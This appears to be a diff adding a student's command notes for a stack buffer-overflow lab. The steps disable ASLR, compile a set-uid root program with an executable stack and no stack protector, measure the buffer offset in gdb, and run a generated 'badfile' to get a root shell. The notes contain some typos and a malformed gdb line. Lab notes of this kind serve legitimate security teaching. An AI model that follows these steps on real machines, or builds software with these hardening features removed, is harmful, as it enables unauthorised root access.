@@ -1,0 +1,40 @@
+// Disable randomization 
+sudo sysctl -w kernel.randomize_va_space=0
+
+cat call_shellcode.c
+
+// compile and set stack as executable
+gcc call_shellcode.c -o shellcode -z execstack // make stack executable
+./shellcode
+
+// set-uid
+sudo chown root shellcode
+sudo chmod 4755 shellcode
+
+// Vulnerable program 
+stack.c
+
+// run as sudo
+gcc stack.c -o stack -z execstack -fno-stack-protector
+chmod 4755 stack
+exit
+
+// debug version
+gcc stack.c -o stack_gdb -g -z execstack -fno-stack-protector
+
+b bof
+r
+p &buffer
+p $ebp
+p(ebp-buffer) - size of buffer
+
+// distance from buffer to stack
++28
+
+Now e generate the baffle using exploit.c
+gcc exploit.c -o exploit
+./exploit
+hexdump -C badfile
+
+// now use baffle to obtain a root shell. Stack using badfile
+ ./stack
